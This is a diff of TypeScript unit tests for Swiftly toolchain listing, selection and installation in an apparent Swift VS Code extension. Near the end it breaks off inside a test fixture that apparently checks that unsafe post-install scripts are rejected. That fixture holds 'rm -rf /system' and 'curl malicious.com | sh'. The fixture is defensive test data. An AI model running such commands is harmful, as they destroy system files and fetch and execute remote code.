@@ -18,13 +18,20 @@ import * as os from "os";
 import { match } from "sinon";
 import * as vscode from "vscode";
 
+import * as askpass from "@src/askpass/askpass-server";
+import { installSwiftlyToolchainWithProgress } from "@src/commands/installSwiftlyToolchain";
 import * as SwiftOutputChannelModule from "@src/logging/SwiftOutputChannel";
-import { Swiftly } from "@src/toolchain/swiftly";
+import {
+    Swiftly,
+    handleMissingSwiftlyToolchain,
+    parseSwiftlyMissingToolchainError,
+} from "@src/toolchain/swiftly";
 import * as utilities from "@src/utilities/utilities";
 
-import { mockGlobalModule, mockGlobalObject, mockGlobalValue } from "../../MockUtils";
+import { instance, mockGlobalModule, mockGlobalObject, mockGlobalValue } from "../../MockUtils";
 
 suite("Swiftly Unit Tests", () => {
+    const mockAskpass = mockGlobalModule(askpass);
     const mockUtilities = mockGlobalModule(utilities);
     const mockedPlatform = mockGlobalValue(process, "platform");
     const mockedEnv = mockGlobalValue(process, "env");
@@ -32,6 +39,7 @@ suite("Swiftly Unit Tests", () => {
     const mockOS = mockGlobalModule(os);
 
     setup(() => {
+        mockAskpass.withAskpassServer.callsFake(task => task("nonce", 8080));
         mockUtilities.execFile.reset();
         mockUtilities.execFileStreamOutput.reset();
         mockSwiftOutputChannelModule.SwiftOutputChannel.reset();
@@ -52,84 +60,161 @@ suite("Swiftly Unit Tests", () => {
 
         mockedPlatform.setValue("darwin");
         mockedEnv.setValue({});
+        mockFS({});
     });
 
     teardown(() => {
-        try {
-            mockFS.restore();
-        } catch {
-            // Ignore if mockFS is not active
-        }
+        mockFS.restore();
     });
 
-    suite("getSwiftlyToolchainInstalls", () => {
-        test("should return toolchain names from list-available command for version 1.1.0", async () => {
+    suite("use()", () => {
+        test("sets the global toolchain if no cwd is provided", async () => {
+            // Mock version check to return 1.0.1
+            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
+                stdout: "1.1.0\n",
+                stderr: "",
+            });
+            // "swiftly use" succeeds
+            mockUtilities.execFile.withArgs("swiftly", match.array.startsWith(["use"])).resolves();
+
+            await Swiftly.use("6.1.0");
+
+            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", [
+                "use",
+                "-y",
+                "--global-default",
+                "6.1.0",
+            ]);
+        });
+
+        test("sets the toolchain in cwd if it is provided", async () => {
+            // CWD exists
+            mockFS({ "/home/user/project": mockFS.directory() });
+            // Mock version check to return 1.0.1
+            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
+                stdout: "1.1.0\n",
+                stderr: "",
+            });
+            // "swiftly use" succeeds
+            mockUtilities.execFile.withArgs("swiftly", match.array.startsWith(["use"])).resolves();
+
+            await Swiftly.use("6.1.0", "/home/user/project");
+
+            expect(mockUtilities.execFile).to.have.been.calledWith(
+                "swiftly",
+                ["use", "-y", "6.1.0"],
+                match.has("cwd", "/home/user/project")
+            );
+            const stats = await fs.stat("/home/user/project/.swift-version");
+            expect(stats.isFile(), "Expected .swift-version file to be created").to.be.true;
+        });
+    });
+
+    suite("list()", () => {
+        test("should return toolchain names from list command for version 1.1.0", async () => {
             // Mock version check to return 1.1.0
             mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                 stdout: "1.1.0\n",
                 stderr: "",
             });
 
-            // Mock list-available command with JSON output
-            const jsonOutput = {
-                toolchains: [
-                    {
-                        inUse: false,
-                        isDefault: false,
-                        version: {
-                            name: "xcode",
-                            type: "system",
-                        },
-                    },
-                    {
-                        inUse: true,
-                        isDefault: true,
-                        version: {
-                            major: 5,
-                            minor: 9,
-                            patch: 0,
-                            name: "swift-5.9.0-RELEASE",
-                            type: "stable",
-                        },
-                    },
-                    {
-                        inUse: false,
-                        isDefault: false,
-                        version: {
-                            major: 5,
-                            minor: 8,
-                            patch: 0,
-                            name: "swift-5.8.0-RELEASE",
-                            type: "stable",
-                        },
-                    },
-                    {
-                        inUse: false,
-                        isDefault: false,
-                        version: {
-                            major: 5,
-                            minor: 10,
-                            branch: "development",
-                            date: "2023-10-15",
-                            name: "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
-                            type: "snapshot",
-                        },
-                    },
-                ],
-            };
-
+            // Mock list command with JSON output
             mockUtilities.execFile.withArgs("swiftly", ["list", "--format=json"]).resolves({
-                stdout: JSON.stringify(jsonOutput),
+                stdout: JSON.stringify({
+                    toolchains: [
+                        {
+                            inUse: true,
+                            isDefault: true,
+                            version: {
+                                major: 5,
+                                minor: 9,
+                                patch: 0,
+                                name: "swift-5.9.0-RELEASE",
+                                type: "stable",
+                            },
+                        },
+                        {
+                            inUse: true,
+                            isDefault: true,
+                            version: {
+                                major: 5,
+                                minor: 10,
+                                patch: 0,
+                                name: "swift-5.10.0-RELEASE",
+                                type: "stable",
+                            },
+                        },
+                        {
+                            inUse: true,
+                            isDefault: true,
+                            version: {
+                                major: 5,
+                                minor: 10,
+                                patch: 1,
+                                name: "swift-5.10.1-RELEASE",
+                                type: "stable",
+                            },
+                        },
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                name: "xcode",
+                                type: "system",
+                            },
+                        },
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                major: 5,
+                                minor: 10,
+                                branch: "development",
+                                date: "2021-10-15",
+                                name: "swift-DEVELOPMENT-SNAPSHOT-2021-10-15-a",
+                                type: "snapshot",
+                            },
+                        },
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                major: 5,
+                                minor: 10,
+                                branch: "development",
+                                date: "2023-10-15",
+                                name: "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
+                                type: "snapshot",
+                            },
+                        },
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                major: 5,
+                                minor: 8,
+                                patch: 0,
+                                name: "swift-5.8.0-RELEASE",
+                                type: "stable",
+                            },
+                        },
+                    ],
+                }),
                 stderr: "",
             });
 
-            const result = await Swiftly.listAvailableToolchains();
+            const result = await Swiftly.list();
 
+            // Toolchains should be sorted newest to oldest with system toolchains appearing first, followed by
+            // stable toolchains, and finally snapshot toolchains.
             expect(result).to.deep.equal([
                 "xcode",
+                "swift-5.10.1-RELEASE",
+                "swift-5.10.0-RELEASE",
                 "swift-5.9.0-RELEASE",
                 "swift-5.8.0-RELEASE",
                 "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
+                "swift-DEVELOPMENT-SNAPSHOT-2021-10-15-a",
             ]);
 
             expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
@@ -145,78 +230,75 @@ suite("Swiftly Unit Tests", () => {
                 stdout: "1.1.0\n",
                 stderr: "",
             });
-
-            // Mock list-available command with JSON output
-            const jsonOutput = {
-                toolchains: [
-                    {
-                        inUse: false,
-                        isDefault: false,
-                        version: {
-                            name: "xcode",
-                            type: "system",
-                            newProp: 1, // Try adding a new property.
-                        },
-                        newProp: 1, // Try adding a new property.
-                    },
-                    {
-                        inUse: false,
-                        isDefault: false,
-                        version: {
-                            // Try adding an unexpected version type.
-                            type: "something_else",
-                        },
-                        newProp: 1, // Try adding a new property.
-                    },
-                    {
-                        inUse: true,
-                        isDefault: true,
-                        version: {
-                            major: 5,
-                            minor: 9,
-                            patch: 0,
-                            name: "swift-5.9.0-RELEASE",
-                            type: "stable",
-                            newProp: 1, // Try adding a new property.
-                        },
-                        newProp: 1, // Try adding a new property.
-                    },
-                    {
-                        inUse: false,
-                        isDefault: false,
-                        version: {
-                            major: 5,
-                            minor: 8,
-                            patch: 0,
-                            name: "swift-5.8.0-RELEASE",
-                            type: "stable",
-                            newProp: 1, // Try adding a new property.
-                        },
-                        newProp: "", // Try adding a new property.
-                    },
-                    {
-                        inUse: false,
-                        isDefault: false,
-                        version: {
-                            major: 5,
-                            minor: 10,
-                            branch: "development",
-                            date: "2023-10-15",
-                            name: "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
-                            type: "snapshot",
-                            newProp: 1, // Try adding a new property.
-                        },
-                        newProp: 1, // Try adding a new property.
-                    },
-                ],
-            };
-
+            // Mock list command with JSON output
             mockUtilities.execFile.withArgs("swiftly", ["list", "--format=json"]).resolves({
-                stdout: JSON.stringify(jsonOutput),
+                stdout: JSON.stringify({
+                    toolchains: [
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                name: "xcode",
+                                type: "system",
+                                newProp: 1, // Try adding a new property.
+                            },
+                            newProp: 1, // Try adding a new property.
+                        },
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                // Try adding an unexpected version type.
+                                type: "something_else",
+                            },
+                            newProp: 1, // Try adding a new property.
+                        },
+                        {
+                            inUse: true,
+                            isDefault: true,
+                            version: {
+                                major: 5,
+                                minor: 9,
+                                patch: 0,
+                                name: "swift-5.9.0-RELEASE",
+                                type: "stable",
+                                newProp: 1, // Try adding a new property.
+                            },
+                            newProp: 1, // Try adding a new property.
+                        },
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                major: 5,
+                                minor: 8,
+                                patch: 0,
+                                name: "swift-5.8.0-RELEASE",
+                                type: "stable",
+                                newProp: 1, // Try adding a new property.
+                            },
+                            newProp: "", // Try adding a new property.
+                        },
+                        {
+                            inUse: false,
+                            isDefault: false,
+                            version: {
+                                major: 5,
+                                minor: 10,
+                                branch: "development",
+                                date: "2023-10-15",
+                                name: "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
+                                type: "snapshot",
+                                newProp: 1, // Try adding a new property.
+                            },
+                            newProp: 1, // Try adding a new property.
+                        },
+                    ],
+                }),
                 stderr: "",
             });
 
-            const result = await Swiftly.listAvailableToolchains();
+            const result = await Swiftly.list();
 
             expect(result).to.deep.equal([
                 "xcode",
@@ -232,13 +314,149 @@ suite("Swiftly Unit Tests", () => {
             ]);
         });
 
+        test("should return toolchain names from the configuration file for version 1.0.1", async () => {
+            // Mock version check to return 1.0.1
+            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
+                stdout: "1.0.1\n",
+                stderr: "",
+            });
+
+            // Swiftly home directory contains a config.json
+            mockedEnv.setValue({ SWIFTLY_HOME_DIR: "/home/.swiftly" });
+            mockFS({
+                "/home/.swiftly/config.json": JSON.stringify({
+                    installedToolchains: ["swift-5.9.0", "swift-6.0.0"],
+                }),
+            });
+
+            const result = await Swiftly.list();
+
+            // Toolchains should be sorted by name in descending order
+            expect(result).to.deep.equal(["swift-6.0.0", "swift-5.9.0"]);
+        });
+
         test("should return empty array when platform is not supported", async () => {
             mockedPlatform.setValue("win32");
 
-            const result = await Swiftly.listAvailableToolchains();
+            const result = await Swiftly.list();
 
             expect(result).to.deep.equal([]);
             expect(mockUtilities.execFile).not.have.been.called;
+        });
+
+        test("should warn and return empty array when version is null", async () => {
+            mockedPlatform.setValue("darwin");
+            const mockLogger = {
+                info: () => {},
+                error: () => {},
+                warn: () => {},
+                debug: () => {},
+            };
+
+            // Mock version to return undefined (not installed)
+            mockUtilities.execFile
+                .withArgs("swiftly", ["--version"])
+                .rejects(new Error("Command not found"));
+
+            const result = await Swiftly.list(mockLogger as any);
+
+            expect(result).to.deep.equal([]);
+            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
+        });
+
+        test("list should handle errors and return empty array", async () => {
+            mockedPlatform.setValue("darwin");
+            const mockLogger = {
+                info: () => {},
+                error: () => {},
+                warn: () => {},
+                debug: () => {},
+            };
+
+            mockUtilities.execFile.withArgs("swiftly", ["--version"]).rejects(new Error("error"));
+
+            const result = await Swiftly.list(instance(mockLogger));
+
+            expect(result).to.deep.equal([]);
+        });
+
+        test("getToolchainInstallLegacy should return empty array when installedToolchains is not an array", async () => {
+            mockedPlatform.setValue("darwin");
+            mockedEnv.setValue({ SWIFTLY_HOME_DIR: "/test/swiftly" });
+
+            // Mock getConfig to return invalid installedToolchains
+            const mockConfig = {
+                installedToolchains: "not-an-array",
+            };
+
+            mockFS.restore();
+            mockFS({
+                "/test/swiftly/config.json": JSON.stringify(mockConfig),
+            });
+
+            const result = await (Swiftly as any).listFromSwiftlyConfig();
+
+            expect(result).to.deep.equal([]);
+        });
+    });
+
+    suite("version", () => {
+        test("should return undefined on unsupported platform", async () => {
+            mockedPlatform.setValue("win32");
+
+            const result = await Swiftly.version();
+
+            expect(result).to.be.undefined;
+            expect(mockUtilities.execFile).to.not.have.been.called;
+        });
+
+        test("should handle execFile errors", async () => {
+            mockedPlatform.setValue("darwin");
+            const mockLogger = {
+                info: () => {},
+                error: () => {},
+                warn: () => {},
+                debug: () => {},
+            };
+
+            mockUtilities.execFile
+                .withArgs("swiftly", ["--version"])
+                .rejects(new Error("Command not found"));
+
+            const result = await Swiftly.version(mockLogger as any);
+
+            expect(result).to.be.undefined;
+            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
+        });
+    });
+
+    suite("supportsJsonOutput", () => {
+        test("should return false on unsupported platform", async () => {
+            mockedPlatform.setValue("win32");
+
+            const result = await (Swiftly as any).supportsJsonOutput();
+
+            expect(result).to.be.false;
+            expect(mockUtilities.execFile).to.not.have.been.called;
+        });
+
+        test("should handle execFile errors and log them", async () => {
+            mockedPlatform.setValue("darwin");
+            const mockLogger = {
+                info: () => {},
+                error: () => {},
+                warn: () => {},
+                debug: () => {},
+            };
+
+            mockUtilities.execFile
+                .withArgs("swiftly", ["--version"])
+                .rejects(new Error("Command failed"));
+
+            const result = await (Swiftly as any).supportsJsonOutput(mockLogger);
+
+            expect(result).to.be.false;
+            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
         });
     });
 
@@ -247,31 +465,30 @@ suite("Swiftly Unit Tests", () => {
             mockedPlatform.setValue("win32");
 
             await expect(
-                Swiftly.installToolchain("6.0.0", undefined)
+                Swiftly.installToolchain("6.0.0", "/path/to/extension", undefined)
             ).to.eventually.be.rejectedWith("Swiftly is not supported on this platform");
             expect(mockUtilities.execFile).to.not.have.been.called;
         });
 
         test("should install toolchain successfully on macOS without progress callback", async () => {
             mockedPlatform.setValue("darwin");
-            mockUtilities.execFile.withArgs("swiftly").resolves({ stdout: "", stderr: "" });
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
 
             const tmpDir = os.tmpdir();
-            mockFS.restore();
             mockFS({
                 [tmpDir]: {},
             });
 
-            await Swiftly.installToolchain("6.0.0", undefined);
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension", undefined);
 
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", [
-                "install",
-                "6.0.0",
-                "--use",
-                "--assume-yes",
-                "--post-install-file",
-                match.string,
-            ]);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                ["install", "6.0.0", "--assume-yes", "--post-install-file", match.string],
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
         });
 
         test("should attempt to install toolchain with progress callback on macOS", async () => {
@@ -279,18 +496,14 @@ suite("Swiftly Unit Tests", () => {
             const progressCallback = () => {};
 
             mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });
-            mockUtilities.execFile.withArgs("swiftly", match.array).resolves({
-                stdout: "",
-                stderr: "",
-            });
+            mockUtilities.execFileStreamOutput.withArgs("swiftly", match.array).resolves();
             os.tmpdir();
-            mockFS.restore();
             mockFS({});
 
             // This test verifies the method starts the installation process
             // The actual file stream handling is complex to mock properly
             try {
-                await Swiftly.installToolchain("6.0.0", progressCallback);
+                await Swiftly.installToolchain("6.0.0", "/path/to/extension", progressCallback);
             } catch (error) {
                 // Expected due to mock-fs limitations with named pipes
                 expect((error as Error).message).to.include("ENOENT");
@@ -302,21 +515,20 @@ suite("Swiftly Unit Tests", () => {
         test("should handle installation error properly", async () => {
             mockedPlatform.setValue("darwin");
             const installError = new Error("Installation failed");
-            mockUtilities.execFile.withArgs("swiftly").rejects(installError);
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").rejects(installError);
 
             const tmpDir = os.tmpdir();
-            mockFS.restore();
             mockFS({
                 [tmpDir]: {},
             });
 
             await expect(
-                Swiftly.installToolchain("6.0.0", undefined)
+                Swiftly.installToolchain("6.0.0", "/path/to/extension", undefined)
             ).to.eventually.be.rejectedWith("Installation failed");
         });
     });
 
-    suite("listAvailable", () => {
+    suite("listAvailable()", () => {
         test("should return empty array on unsupported platform", async () => {
             mockedPlatform.setValue("win32");
 
@@ -350,156 +562,183 @@ suite("Swiftly Unit Tests", () => {
 
         test("should return available toolchains with installation status", async () => {
             mockedPlatform.setValue("darwin");
-
             mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                 stdout: "1.1.0\n",
                 stderr: "",
             });
-
-            const availableResponse = {
-                toolchains: [
-                    {
-                        inUse: false,
-                        installed: false,
-                        isDefault: false,
-                        version: {
-                            type: "stable",
-                            major: 6,
-                            minor: 0,
-                            patch: 0,
-                            name: "6.0.0",
-                        },
-                    },
-                    {
-                        inUse: false,
-                        installed: false,
-                        isDefault: false,
-                        version: {
-                            type: "snapshot",
-                            major: 6,
-                            minor: 1,
-                            branch: "main",
-                            date: "2025-01-15",
-                            name: "main-snapshot-2025-01-15",
-                        },
-                    },
-                ],
-            };
-
             mockUtilities.execFile
                 .withArgs("swiftly", ["list-available", "--format=json"])
                 .resolves({
-                    stdout: JSON.stringify(availableResponse),
+                    stdout: JSON.stringify({
+                        toolchains: [
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "stable",
+                                    major: 6,
+                                    minor: 0,
+                                    patch: 0,
+                                    name: "6.0.0",
+                                },
+                            },
+                            {
+                                inUse: false,
+                                installed: true,
+                                isDefault: false,
+                                version: {
+                                    type: "system",
+                                    name: "xcode",
+                                },
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "stable",
+                                    major: 6,
+                                    minor: 0,
+                                    patch: 1,
+                                    name: "6.0.1",
+                                },
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "snapshot",
+                                    major: 6,
+                                    minor: 1,
+                                    branch: "main",
+                                    date: "2025-01-15",
+                                    name: "main-snapshot-2025-01-15",
+                                },
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "stable",
+                                    major: 5,
+                                    minor: 9,
+                                    patch: 0,
+                                    name: "5.9.0",
+                                },
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "snapshot",
+                                    major: 5,
+                                    minor: 9,
+                                    branch: "main",
+                                    date: "2023-01-15",
+                                    name: "main-snapshot-2023-01-15",
+                                },
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "stable",
+                                    major: 5,
+                                    minor: 10,
+                                    patch: 0,
+                                    name: "5.10.0",
+                                },
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "stable",
+                                    major: 5,
+                                    minor: 10,
+                                    patch: 1,
+                                    name: "5.10.1",
+                                },
+                            },
+                        ],
+                    }),
                     stderr: "",
                 });
 
-            const installedResponse = {
-                toolchains: [
-                    {
-                        inUse: true,
-                        isDefault: true,
-                        version: {
-                            type: "stable",
-                            major: 6,
-                            minor: 0,
-                            patch: 0,
-                            name: "6.0.0",
-                        },
-                    },
-                ],
-            };
-
-            mockUtilities.execFile.withArgs("swiftly", ["list", "--format=json"]).resolves({
-                stdout: JSON.stringify(installedResponse),
-                stderr: "",
-            });
-
             const result = await Swiftly.listAvailable();
-            expect(result).to.deep.equal([
-                {
-                    inUse: false,
-                    installed: false,
-                    isDefault: false,
-                    version: {
-                        type: "stable",
-                        major: 6,
-                        minor: 0,
-                        patch: 0,
-                        name: "6.0.0",
-                    },
-                },
-                {
-                    inUse: false,
-                    installed: false,
-                    isDefault: false,
-                    version: {
-                        type: "snapshot",
-                        major: 6,
-                        minor: 1,
-                        branch: "main",
-                        date: "2025-01-15",
-                        name: "main-snapshot-2025-01-15",
-                    },
-                },
+
+            // Toolchains should be sorted newest to oldest with system toolchains appearing first, followed by
+            // stable toolchains, and finally snapshot toolchains.
+            expect(result.map(toolchain => toolchain.version.name)).to.deep.equal([
+                "xcode",
+                "6.0.1",
+                "6.0.0",
+                "5.10.1",
+                "5.10.0",
+                "5.9.0",
+                "main-snapshot-2025-01-15",
+                "main-snapshot-2023-01-15",
             ]);
         });
 
         test("should be able to parse future additions to the output and ignore unexpected types", async () => {
             mockedPlatform.setValue("darwin");
-
             mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                 stdout: "1.1.0\n",
                 stderr: "",
             });
-
-            const availableResponse = {
-                toolchains: [
-                    {
-                        inUse: false,
-                        installed: false,
-                        isDefault: false,
-                        version: {
-                            // Try adding an unexpected version type.
-                            type: "something_else",
-                        },
-                        newProp: 1, // Try adding a new property.
-                    },
-                    {
-                        inUse: false,
-                        installed: false,
-                        isDefault: false,
-                        version: {
-                            type: "stable",
-                            major: 6,
-                            minor: 0,
-                            patch: 0,
-                            name: "6.0.0",
-                            newProp: 1, // Try adding a new property.
-                        },
-                        newProp: 1, // Try adding a new property.
-                    },
-                    {
-                        inUse: false,
-                        installed: false,
-                        isDefault: false,
-                        version: {
-                            type: "snapshot",
-                            major: 6,
-                            minor: 1,
-                            branch: "main",
-                            date: "2025-01-15",
-                            name: "main-snapshot-2025-01-15",
-                            newProp: 1, // Try adding a new property.
-                        },
-                        newProp: 1, // Try adding a new property.
-                    },
-                ],
-            };
-
             mockUtilities.execFile
                 .withArgs("swiftly", ["list-available", "--format=json"])
                 .resolves({
-                    stdout: JSON.stringify(availableResponse),
+                    stdout: JSON.stringify({
+                        toolchains: [
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    // Try adding an unexpected version type.
+                                    type: "something_else",
+                                },
+                                newProp: 1, // Try adding a new property.
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "stable",
+                                    major: 6,
+                                    minor: 0,
+                                    patch: 0,
+                                    name: "6.0.0",
+                                    newProp: 1, // Try adding a new property.
+                                },
+                                newProp: 1, // Try adding a new property.
+                            },
+                            {
+                                inUse: false,
+                                installed: false,
+                                isDefault: false,
+                                version: {
+                                    type: "snapshot",
+                                    major: 6,
+                                    minor: 1,
+                                    branch: "main",
+                                    date: "2025-01-15",
+                                    name: "main-snapshot-2025-01-15",
+                                    newProp: 1, // Try adding a new property.
+                                },
+                                newProp: 1, // Try adding a new property.
+                            },
+                        ],
+                    }),
                     stderr: "",
                 });
 
@@ -588,7 +827,7 @@ suite("Swiftly Unit Tests", () => {
                     stderr: "",
                 });
 
-            const result = await Swiftly.listAvailable(undefined, "main-snapshot");
+            const result = await Swiftly.listAvailable("main-snapshot");
             expect(result).to.deep.equal([
                 {
                     inUse: false,
@@ -622,30 +861,30 @@ suite("Swiftly Unit Tests", () => {
         });
 
         test("should call installToolchain with correct parameters", async () => {
-            mockUtilities.execFile.withArgs("swiftly").resolves({ stdout: "", stderr: "" });
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
             mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
             // Verify swiftly install was called with post-install file argument
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", [
-                "install",
-                "6.0.0",
-                "--use",
-                "--assume-yes",
-                "--post-install-file",
-                match.string,
-            ]);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                ["install", "6.0.0", "--assume-yes", "--post-install-file", match.string],
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
         });
 
         test("should handle swiftly installation errors", async () => {
             const installError = new Error("Swiftly installation failed");
-            mockUtilities.execFile.withArgs("swiftly").rejects(installError);
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").rejects(installError);
             mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });
 
-            await expect(Swiftly.installToolchain("6.0.0")).to.eventually.be.rejectedWith(
-                "Swiftly installation failed"
-            );
+            await expect(
+                Swiftly.installToolchain("6.0.0", "/path/to/extension")
+            ).to.eventually.be.rejectedWith("Swiftly installation failed");
         });
 
         test("should handle mkfifo creation errors", async () => {
@@ -655,34 +894,48 @@ suite("Swiftly Unit Tests", () => {
             const progressCallback = () => {};
 
             await expect(
-                Swiftly.installToolchain("6.0.0", progressCallback)
+                Swiftly.installToolchain("6.0.0", "/path/to/extension", progressCallback)
             ).to.eventually.be.rejectedWith("Cannot create named pipe");
         });
 
         test("should install without progress callback successfully", async () => {
-            mockUtilities.execFile.withArgs("swiftly").resolves({ stdout: "", stderr: "" });
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
             // mkfifo should not be called when no progress callback is provided
             expect(mockUtilities.execFile).to.not.have.been.calledWith("mkfifo", match.array);
         });
 
         test("should create progress pipe when progress callback is provided", async () => {
-            mockUtilities.execFile.withArgs("swiftly").resolves({ stdout: "", stderr: "" });
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
             mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });
 
             const progressCallback = () => {};
 
             try {
-                await Swiftly.installToolchain("6.0.0", progressCallback);
+                await Swiftly.installToolchain("6.0.0", "/path/to/extension", progressCallback);
             } catch (error) {
                 // Expected due to mock-fs limitations with named pipes in this test environment
             }
 
             expect(mockUtilities.execFile).to.have.been.calledWith("mkfifo", match.array);
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
         });
     });
 
@@ -714,33 +967,39 @@ suite("Swiftly Unit Tests", () => {
 apt-get -y install build-essential
 apt-get -y install libncurses5-dev`;
 
-            mockUtilities.execFile
+            mockUtilities.execFileStreamOutput
                 .withArgs("swiftly", [
                     "install",
                     "6.0.0",
-                    "--use",
                     "--assume-yes",
                     "--post-install-file",
                     match.string,
                 ])
                 .callsFake(async (_command, args) => {
-                    const postInstallPath = args[5];
+                    const postInstallPath = args[4];
                     await fs.writeFile(postInstallPath, validScript);
-                    return { stdout: "", stderr: "" };
+                    return;
                 });
             mockUtilities.execFile
                 .withArgs("chmod", match.array)
                 .resolves({ stdout: "", stderr: "" });
 
-            // Mock execFileStreamOutput for pkexec
-            mockUtilities.execFileStreamOutput.resolves();
+            // Mock execFileStreamOutput for sudo
+            mockUtilities.execFileStreamOutput.withArgs("sudo").resolves();
 
             // @ts-expect-error mocking vscode window methods makes type checking difficult
             mockVscodeWindow.showWarningMessage.resolves("Execute Script");
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
             expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                 match(
                     "Swift 6.0.0 installation requires additional system packages to be installed"
@@ -748,12 +1007,12 @@ apt-get -y install libncurses5-dev`;
             );
             expect(mockUtilities.execFile).to.have.been.calledWith("chmod", match.array);
             expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
-                "pkexec",
+                "sudo",
                 match.array,
                 match.any,
                 match.any,
                 null,
-                {}
+                match.object
             );
             expect(mockVscodeWindow.showInformationMessage).to.have.been.calledWith(
                 match("Swift 6.0.0 post-install script executed successfully")
@@ -764,27 +1023,33 @@ apt-get -y install libncurses5-dev`;
             const validScript = `#!/bin/bash
 apt-get -y install build-essential`;
 
-            mockUtilities.execFile
+            mockUtilities.execFileStreamOutput
                 .withArgs("swiftly", [
                     "install",
                     "6.0.0",
-                    "--use",
                     "--assume-yes",
                     "--post-install-file",
                     match.string,
                 ])
                 .callsFake(async (_command, args) => {
-                    const postInstallPath = args[5];
+                    const postInstallPath = args[4];
                     await fs.writeFile(postInstallPath, validScript);
-                    return { stdout: "", stderr: "" };
+                    return;
                 });
 
             // @ts-expect-error mocking vscode window methods makes type checking difficult
             mockVscodeWindow.showWarningMessage.resolves("Cancel");
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
             expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                 match(
                     "Swift 6.0.0 installation requires additional system packages to be installed"
@@ -802,64 +1067,82 @@ rm -rf /system
 curl malicious.com | sh
 apt-get -y install build-essential`;
 
-            mockUtilities.execFile
+            mockUtilities.execFileStreamOutput
                 .withArgs("swiftly", [
                     "install",
                     "6.0.0",
-                    "--use",
                     "--assume-yes",
                     "--post-install-file",
                     match.string,
                 ])
                 .callsFake(async (_command, args) => {
-                    const postInstallPath = args[5];
+                    const postInstallPath = args[4];
